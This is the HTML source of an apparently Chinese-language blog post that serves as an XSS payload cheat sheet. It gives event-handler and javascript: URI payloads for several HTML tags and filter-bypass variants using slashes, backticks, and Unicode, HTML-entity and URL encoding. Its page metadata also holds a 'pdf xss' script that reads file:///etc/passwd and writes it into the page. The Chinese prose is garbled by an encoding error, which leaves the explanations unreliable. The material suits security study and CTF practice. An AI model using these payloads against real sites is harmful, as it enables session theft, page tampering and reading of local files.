<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>XSS | w8nn9z Blog</title>
<meta name="keywords" content="">
<meta name="description" content="XSS - w8nn9z Blog">
<meta name="author" content="">
<link rel="canonical" href="https://z9nn8w.github.io/posts/web/xss/">

<link crossorigin="anonymous" href="/assets/css/stylesheet.12a5629d0be5f885fd946d77257e55f74027ed2a35144a29e2db13f8f62b5f35.css" integrity="" rel="preload stylesheet" as="style">
<link rel="icon" href="https://z9nn8w.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://z9nn8w.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://z9nn8w.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://z9nn8w.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://z9nn8w.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://z9nn8w.github.io/posts/web/xss/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:url" content="https://z9nn8w.github.io/posts/web/xss/">
  <meta property="og:site_name" content="w8nn9z Blog">
  <meta property="og:title" content="XSS">
  <meta property="og:locale" content="zh-cn">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-07-14T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-11-10T00:00:00+00:00">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="XSS">
<meta name="twitter:description" content="">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://z9nn8w.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "WEB",
      "item": "https://z9nn8w.github.io/posts/web/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "XSS",
      "item": "https://z9nn8w.github.io/posts/web/xss/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "XSS",
  "name": "XSS",
  "description": "",
  "keywords": [
    
  ],
  "articleBody": "XSSåˆ†ç±» åå°„å‹XSS DOMå‹XSS å­˜å‚¨å‹XSS htmlæ ‡ç­¾ä¸­åµŒå…¥js a æ ‡ç­¾ åˆ›å»ºè¶…é“¾æ¥ï¼Œéœ€è¦é€šè¿‡è§¦å‘äº‹ä»¶æ¥è§¦å‘xssï¼Œæ¯”å¦‚ç‚¹å‡»ã€é¼ æ ‡æ‚¬åœç­‰ï¼š\n\u003ca href=\"javascript:alert('XSS')\"\u003etest\u003c/a\u003e \u003ca/href=\"javascript:alert('XSS')\"\u003etest \u003ca href=x onfocus=\"alert('XSS');\"\u003etest\u003c/a\u003e \u003ca href=\"x\" onclick=eval(\"alert('XSS');\")\u003etest\u003c/a\u003e \u003ca href=\"x\" onmouseover=\"alert('XSS');\"\u003etest\u003c/a\u003e \u003ca href=x onmouseout=\"alert('XSS');\"\u003etest\u003c/a\u003e img æ ‡ç­¾ é€šè¿‡onerroræ¥è§¦å‘xss\n\u003cimg src=x onerror=\"alert(1)\"\u003e iframe æ ‡ç­¾ \u003ciframe src=\"javascript:alert(1)\"\u003etest\u003c/iframe\u003e \u003ciframe onload=\"alert('XSS');\"\u003e\u003c/iframe\u003e \u003ciframe/src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=\"\u003e Edge/Chrome audio æ ‡ç­¾ \u003caudio src=1 onerror=alert(1)\u003e video æ ‡ç­¾ svg æ ‡ç­¾ button æ ‡ç­¾ details æ ‡ç­¾ éœ€è¦å±•å¼€è¯¦ç»†ä¿¡æ¯ï¼š\nbody æ ‡ç­¾ bypass ç©ºæ ¼ç»•è¿‡ æ–œæ  / ç»•è¿‡ç©ºæ ¼ï¼š\n\u003cimg/src=\"x\"/onerror=alert(1)\u003e \u003cimg/src=x onerror=alert(1)\u003e æ‹¬å·ç»•è¿‡ åå¼•å·ç»•è¿‡æ‹¬å·ï¼š\n\u003cscript\u003ealert`1`\u003c/script\u003e unicodeç¼–ç  æ— æ³•ç¼–ç æ“ä½œç¬¦å’Œæ ‡ç‚¹ç¬¦å·ï¼Œæ¯”å¦‚æ‹¬å·ï¼š\n\u003cscript\u003e\\u0061lert(1)\u003c/script\u003e htmlç¼–ç  \u003ca href=\"\u0026#106;\u0026#97;\u0026#118;\u0026#97;\u0026#115;\u0026#99;\u0026#114;\u0026#105;\u0026#112;\u0026#116;\u0026#58;\u0026#97;\u0026#108;\u0026#101;\u0026#114;\u0026#116;\u0026#40;\u0026#49;\u0026#41;\"\u003etest\u003c/a\u003e \u003ca href=\"\u0026#x6a;\u0026#x61;\u0026#x76;\u0026#x61;\u0026#x73;\u0026#x63;\u0026#x72;\u0026#x69;\u0026#x70;\u0026#x74;\u0026#x3a;\u0026#x61;\u0026#x6c;\u0026#x65;\u0026#x72;\u0026#x74;\u0026#x28;\u0026#x31;\u0026#x29;\"\u003etest\u003c/a\u003e \u003ca href=\"\u0026#x6a\u0026#x61\u0026#x76\u0026#x61\u0026#x73\u0026#x63\u0026#x72\u0026#x69\u0026#x70\u0026#x74\u0026#x3a\u0026#x61\u0026#x6c\u0026#x65\u0026#x72\u0026#x74\u0026#x28\u0026#x31\u0026#x29\"\u003etest\u003c/a\u003e urlç¼–ç  åœ¨src/hrefå¤„ä½¿ç”¨ï¼Œhtmlä¼šå¤„ç† javascript åçš„urlç¼–ç ï¼š\n\u003ciframe src=\"javascript:%61%6c%65%72%74%28%31%29\"\u003etest\u003c/iframe\u003e Edge/Chrome \u003ca href=\"javascript:%61%6c%65%72%74%28%31%29\"\u003etest\u003c/a\u003e xssåˆ©ç”¨åœºæ™¯ pdf xss \u003cscript\u003ex=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open('GET','file:///etc/passwd');x.send();\u003c/script\u003e https://xss-game.appspot.com/ ä¸Šçš„6ä¸ªxssæŒ‘æˆ˜ Level 1: Hello, world of XSS ç½‘é¡µæºç ï¼š\npage_header = \"\"\" \u003c!doctype html\u003e \"\"\" page_footer = \"\"\" \"\"\" main_page_markup = \"\"\" ",
  "wordCount" : "2264",
  "inLanguage": "en",
  "datePublished": "2025-07-14T00:00:00Z",
  "dateModified": "2025-11-10T00:00:00Z",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://z9nn8w.github.io/posts/web/xss/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "w8nn9z Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://z9nn8w.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://z9nn8w.github.io/" accesskey="h" title="w8nn9z Blog (Alt + H)">w8nn9z Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://z9nn8w.github.io/search" title="æœç´¢ (Alt &#43; /)" accesskey=/>
                    <span>æœç´¢</span>
                </a>
            </li>
            <li>
                <a href="https://z9nn8w.github.io/posts" title="æ–‡ç« ">
                    <span>æ–‡ç« </span>
                </a>
            </li>
            <li>
                <a href="https://z9nn8w.github.io/archives" title="å½’æ¡£">
                    <span>å½’æ¡£</span>
                </a>
            </li>
            <li>
                <a href="https://z9nn8w.github.io/about" title="å…³äº">
                    <span>å…³äº</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      XSS
    </h1>
    <div class="post-meta"><span title='2025-07-14 00:00:00 +0000 UTC'>July 14, 2025</span>

</div>
  </header> <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details >
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">Table of Contents</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#xss%e5%88%86%e7%b1%bb" aria-label="XSSåˆ†ç±»">XSSåˆ†ç±»</a><ul>
                            
                    <li>
                        <a href="#%e5%8f%8d%e5%b0%84%e5%9e%8bxss" aria-label="åå°„å‹XSS">åå°„å‹XSS</a></li>
                    <li>
                        <a href="#dom%e5%9e%8bxss" aria-label="DOMå‹XSS">DOMå‹XSS</a></li>
                    <li>
                        <a href="#%e5%ad%98%e5%82%a8%e5%9e%8bxss" aria-label="å­˜å‚¨å‹XSS">å­˜å‚¨å‹XSS</a></li></ul>
                    </li>
                    <li>
                        <a href="#html%e6%a0%87%e7%ad%be%e4%b8%ad%e5%b5%8c%e5%85%a5js" aria-label="htmlæ ‡ç­¾ä¸­åµŒå…¥js">htmlæ ‡ç­¾ä¸­åµŒå…¥js</a><ul>
                            
                    <li>
                        <a href="#a-%e6%a0%87%e7%ad%be" aria-label="a æ ‡ç­¾">a æ ‡ç­¾</a></li>
                    <li>
                        <a href="#img-%e6%a0%87%e7%ad%be" aria-label="img æ ‡ç­¾">img æ ‡ç­¾</a></li>
                    <li>
                        <a href="#iframe-%e6%a0%87%e7%ad%be" aria-label="iframe æ ‡ç­¾">iframe æ ‡ç­¾</a></li>
                    <li>
                        <a href="#audio-%e6%a0%87%e7%ad%be" aria-label="audio æ ‡ç­¾">audio æ ‡ç­¾</a></li>
                    <li>
                        <a href="#video-%e6%a0%87%e7%ad%be" aria-label="video æ ‡ç­¾">video æ ‡ç­¾</a></li>
                    <li>
                        <a href="#svg-%e6%a0%87%e7%ad%be" aria-label="svg æ ‡ç­¾">svg æ ‡ç­¾</a></li>
                    <li>
                        <a href="#button-%e6%a0%87%e7%ad%be" aria-label="button æ ‡ç­¾">button æ ‡ç­¾</a></li>
                    <li>
                        <a href="#details-%e6%a0%87%e7%ad%be" aria-label="details æ ‡ç­¾">details æ ‡ç­¾</a></li>
                    <li>
                        <a href="#body-%e6%a0%87%e7%ad%be" aria-label="body æ ‡ç­¾">body æ ‡ç­¾</a></li></ul>
                    </li>
                    <li>
                        <a href="#bypass" aria-label="bypass">bypass</a><ul>
                            
                    <li>
                        <a href="#%e7%a9%ba%e6%a0%bc%e7%bb%95%e8%bf%87" aria-label="ç©ºæ ¼ç»•è¿‡">ç©ºæ ¼ç»•è¿‡</a></li>
                    <li>
                        <a href="#%e6%8b%ac%e5%8f%b7%e7%bb%95%e8%bf%87" aria-label="æ‹¬å·ç»•è¿‡">æ‹¬å·ç»•è¿‡</a></li>
                    <li>
                        <a href="#unicode%e7%bc%96%e7%a0%81" aria-label="unicodeç¼–ç ">unicodeç¼–ç </a></li>
                    <li>
                        <a href="#html%e7%bc%96%e7%a0%81" aria-label="htmlç¼–ç ">htmlç¼–ç </a></li>
                    <li>
                        <a href="#url%e7%bc%96%e7%a0%81" aria-label="urlç¼–ç ">urlç¼–ç </a></li></ul>
                    </li>
                    <li>
                        <a href="#xss%e5%88%a9%e7%94%a8%e5%9c%ba%e6%99%af" aria-label="xssåˆ©ç”¨åœºæ™¯">xssåˆ©ç”¨åœºæ™¯</a><ul>
                            
                    <li>
                        <a href="#pdf-xss" aria-label="pdf xss">pdf xss</a></li></ul>
                    </li>
                    <li>
                        <a href="#%e4%b8%8a%e7%9a%846%e4%b8%aaxss%e6%8c%91%e6%88%98" aria-label="https://xss-game.appspot.com/ ä¸Šçš„6ä¸ªxssæŒ‘æˆ˜"><a href="https://xss-game.appspot.com/">https://xss-game.appspot.com/</a> ä¸Šçš„6ä¸ªxssæŒ‘æˆ˜</a><ul>
                            
                    <li>
                        <a href="#level-1-hello-world-of-xss" aria-label="Level 1: Hello, world of XSS">Level 1: Hello, world of XSS</a></li>
                    <li>
                        <a href="#level-2-persistence-is-key" aria-label="Level 2: Persistence is key">Level 2: Persistence is key</a></li>
                    <li>
                        <a href="#level-3-that-sinking-feeling" aria-label="Level 3: That sinking feeling&hellip;">Level 3: That sinking feeling&hellip;</a></li>
                    <li>
                        <a href="#level-4-context-matters" aria-label="Level 4: Context matters">Level 4: Context matters</a></li>
                    <li>
                        <a href="#level-5-breaking-protocol" aria-label="Level 5: Breaking protocol">Level 5: Breaking protocol</a></li>
                    <li>
                        <a href="#level-6-follow-the-" aria-label="Level 6: Follow the ğŸ‡">Level 6: Follow the ğŸ‡</a>
                    </li>
                </ul>
                </li>
                </ul>
            </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    
    document.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();
    
        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
        if (elements.length > 0) {
            
            activeElement = elements[0];
            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
        }
    
        
        const topLink = document.getElementById('top-link');
        if (topLink) {
            topLink.addEventListener('click', (event) => {
                
                event.preventDefault();
    
                
                window.scrollTo({ top: 0, behavior: 'smooth' });
            });
        }
    }, false);
    
    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);
    
    window.addEventListener('scroll', () => {
        
        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
    
        
        if (scrollPosition === 0) {
            return;
        }
    
        
        if (elements && elements.length > 0) {
            
            activeElement = Array.from(elements).find((element) => {
                if ((getOffsetTop(element) - scrollPosition) > 0 && 
                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
                    return element;
                }
            }) || activeElement;
    
            elements.forEach(element => {
                const id = encodeURI(element.getAttribute('id')).toLowerCase();
                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
                if (element === activeElement){
                    tocLink.classList.add('active');
    
                    
                    const tocContainer = document.querySelector('.toc .inner');
                    const linkOffsetTop = tocLink.offsetTop;
                    const containerHeight = tocContainer.clientHeight;
                    const linkHeight = tocLink.clientHeight;
    
                    
                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
                } else {
                    tocLink.classList.remove('active');
                }
            });
        }
    }, false);
    
    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
    
    function checkTocPosition() {
        const width = document.body.scrollWidth;
    
        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }
    
    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
    
</script>

  <div class="post-content"><h2 id="xssåˆ†ç±»">XSSåˆ†ç±»<a hidden class="anchor" aria-hidden="true" href="#xssåˆ†ç±»">#</a></h2>
<h3 id="åå°„å‹xss">åå°„å‹XSS<a hidden class="anchor" aria-hidden="true" href="#åå°„å‹xss">#</a></h3>
<h3 id="domå‹xss">DOMå‹XSS<a hidden class="anchor" aria-hidden="true" href="#domå‹xss">#</a></h3>
<h3 id="å­˜å‚¨å‹xss">å­˜å‚¨å‹XSS<a hidden class="anchor" aria-hidden="true" href="#å­˜å‚¨å‹xss">#</a></h3>
<h2 id="htmlæ ‡ç­¾ä¸­åµŒå…¥js">htmlæ ‡ç­¾ä¸­åµŒå…¥js<a hidden class="anchor" aria-hidden="true" href="#htmlæ ‡ç­¾ä¸­åµŒå…¥js">#</a></h2>
<h3 id="a-æ ‡ç­¾">a æ ‡ç­¾<a hidden class="anchor" aria-hidden="true" href="#a-æ ‡ç­¾">#</a></h3>
<p>åˆ›å»ºè¶…é“¾æ¥ï¼Œéœ€è¦é€šè¿‡è§¦å‘äº‹ä»¶æ¥è§¦å‘xssï¼Œæ¯”å¦‚ç‚¹å‡»ã€é¼ æ ‡æ‚¬åœç­‰ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript:alert(&#39;XSS&#39;)&#34;</span>&gt;test&lt;/<span style="color:#f92672">a</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript:alert(&#39;XSS&#39;)&#34;</span>&gt;test
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">x</span> <span style="color:#a6e22e">onfocus</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;alert(&#39;XSS&#39;);&#34;</span>&gt;test&lt;/<span style="color:#f92672">a</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;x&#34;</span> <span style="color:#a6e22e">onclick</span><span style="color:#f92672">=</span><span style="color:#e6db74">eval(&#34;alert(&#39;XSS&#39;);&#34;)</span>&gt;test&lt;/<span style="color:#f92672">a</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;x&#34;</span> <span style="color:#a6e22e">onmouseover</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;alert(&#39;XSS&#39;);&#34;</span>&gt;test&lt;/<span style="color:#f92672">a</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">x</span> <span style="color:#a6e22e">onmouseout</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;alert(&#39;XSS&#39;);&#34;</span>&gt;test&lt;/<span style="color:#f92672">a</span>&gt;
</span></span></code></pre></div><h3 id="img-æ ‡ç­¾">img æ ‡ç­¾<a hidden class="anchor" aria-hidden="true" href="#img-æ ‡ç­¾">#</a></h3>
<p>é€šè¿‡onerroræ¥è§¦å‘xss</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">x</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;alert(1)&#34;</span>&gt;
</span></span></code></pre></div><h3 id="iframe-æ ‡ç­¾">iframe æ ‡ç­¾<a hidden class="anchor" aria-hidden="true" href="#iframe-æ ‡ç­¾">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript:alert(1)&#34;</span>&gt;test&lt;/<span style="color:#f92672">iframe</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">onload</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;alert(&#39;XSS&#39;);&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&#34;</span>&gt;  Edge/Chrome
</span></span></code></pre></div><h3 id="audio-æ ‡ç­¾">audio æ ‡ç­¾<a hidden class="anchor" aria-hidden="true" href="#audio-æ ‡ç­¾">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">audio</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">1</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">alert(1)</span>&gt;
</span></span></code></pre></div><h3 id="video-æ ‡ç­¾">video æ ‡ç­¾<a hidden class="anchor" aria-hidden="true" href="#video-æ ‡ç­¾">#</a></h3>
<!-- raw HTML omitted -->
<h3 id="svg-æ ‡ç­¾">svg æ ‡ç­¾<a hidden class="anchor" aria-hidden="true" href="#svg-æ ‡ç­¾">#</a></h3>
<p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<h3 id="button-æ ‡ç­¾">button æ ‡ç­¾<a hidden class="anchor" aria-hidden="true" href="#button-æ ‡ç­¾">#</a></h3>
<!-- raw HTML omitted -->
<h3 id="details-æ ‡ç­¾">details æ ‡ç­¾<a hidden class="anchor" aria-hidden="true" href="#details-æ ‡ç­¾">#</a></h3>
<p>éœ€è¦å±•å¼€è¯¦ç»†ä¿¡æ¯ï¼š</p>
<!-- raw HTML omitted -->
<h3 id="body-æ ‡ç­¾">body æ ‡ç­¾<a hidden class="anchor" aria-hidden="true" href="#body-æ ‡ç­¾">#</a></h3>
<!-- raw HTML omitted -->
<h2 id="bypass">bypass<a hidden class="anchor" aria-hidden="true" href="#bypass">#</a></h2>
<h3 id="ç©ºæ ¼ç»•è¿‡">ç©ºæ ¼ç»•è¿‡<a hidden class="anchor" aria-hidden="true" href="#ç©ºæ ¼ç»•è¿‡">#</a></h3>
<p>æ–œæ  <code>/</code> ç»•è¿‡ç©ºæ ¼ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">img</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;x&#34;</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">alert(1)</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">img</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">x</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">alert(1)</span>&gt;
</span></span></code></pre></div><h3 id="æ‹¬å·ç»•è¿‡">æ‹¬å·ç»•è¿‡<a hidden class="anchor" aria-hidden="true" href="#æ‹¬å·ç»•è¿‡">#</a></h3>
<p>åå¼•å·ç»•è¿‡æ‹¬å·ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span><span style="color:#e6db74">`1`</span>&lt;/<span style="color:#f92672">script</span>&gt;
</span></span></code></pre></div><h3 id="unicodeç¼–ç ">unicodeç¼–ç <a hidden class="anchor" aria-hidden="true" href="#unicodeç¼–ç ">#</a></h3>
<p>æ— æ³•ç¼–ç æ“ä½œç¬¦å’Œæ ‡ç‚¹ç¬¦å·ï¼Œæ¯”å¦‚æ‹¬å·ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">\u0061lert</span>(<span style="color:#ae81ff">1</span>)&lt;/<span style="color:#f92672">script</span>&gt;
</span></span></code></pre></div><h3 id="htmlç¼–ç ">htmlç¼–ç <a hidden class="anchor" aria-hidden="true" href="#htmlç¼–ç ">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&#34;</span>&gt;test&lt;/<span style="color:#f92672">a</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&#34;</span>&gt;test&lt;/<span style="color:#f92672">a</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&amp;#x6a&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3a&amp;#x61&amp;#x6c&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x31&amp;#x29&#34;</span>&gt;test&lt;/<span style="color:#f92672">a</span>&gt;
</span></span></code></pre></div><h3 id="urlç¼–ç ">urlç¼–ç <a hidden class="anchor" aria-hidden="true" href="#urlç¼–ç ">#</a></h3>
<p>åœ¨src/hrefå¤„ä½¿ç”¨ï¼Œhtmlä¼šå¤„ç† <code>javascript</code> åçš„urlç¼–ç ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript:%61%6c%65%72%74%28%31%29&#34;</span>&gt;test&lt;/<span style="color:#f92672">iframe</span>&gt;  Edge/Chrome
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript:%61%6c%65%72%74%28%31%29&#34;</span>&gt;test&lt;/<span style="color:#f92672">a</span>&gt;
</span></span></code></pre></div><h2 id="xssåˆ©ç”¨åœºæ™¯">xssåˆ©ç”¨åœºæ™¯<a hidden class="anchor" aria-hidden="true" href="#xssåˆ©ç”¨åœºæ™¯">#</a></h2>
